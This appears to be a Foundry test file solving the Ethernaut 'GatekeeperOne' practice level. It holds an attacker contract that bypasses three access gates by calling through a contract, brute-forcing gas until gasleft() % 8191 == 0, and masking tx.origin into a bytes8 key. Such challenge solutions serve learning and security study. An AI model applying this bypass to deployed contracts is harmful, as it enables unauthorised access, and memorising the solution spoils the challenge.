// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {GatekeeperOne} from "../src/levels/GatekeeperOne.sol";

/// Ethernaut #13 "GatekeeperOne" → SC01 access / multi-gate bypass (no exact catalog entry).
/// gateOne: call via a contract (msg.sender != tx.origin). gateTwo: brute-force the call gas so
/// `gasleft() % 8191 == 0`. gateThree: a bytes8 key whose lower 32 bits == lower 16 bits == the low
/// 16 bits of tx.origin, with the upper 32 bits non-zero. Win: entrant == player.
contract GatekeeperOneAttacker {
    function attack(address gk) external {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for (uint256 g = 0; g < 8191; g++) {
            (bool ok,) = gk.call{gas: 1_000_000 + g}(abi.encodeWithSignature("enter(bytes8)", key));
            if (ok) return;
        }
        revert("no gas offset worked");
    }
}

contract GatekeeperOneTest is Test {
    address player = makeAddr("player");

    function test_solve_gatekeeperOne() public {
        GatekeeperOne lvl = new GatekeeperOne();
        GatekeeperOneAttacker a = new GatekeeperOneAttacker();
        vm.prank(player, player); // tx.origin = player
        a.attack(address(lvl));
        assertEq(lvl.entrant(), player, "passed all three gates");
    }
}
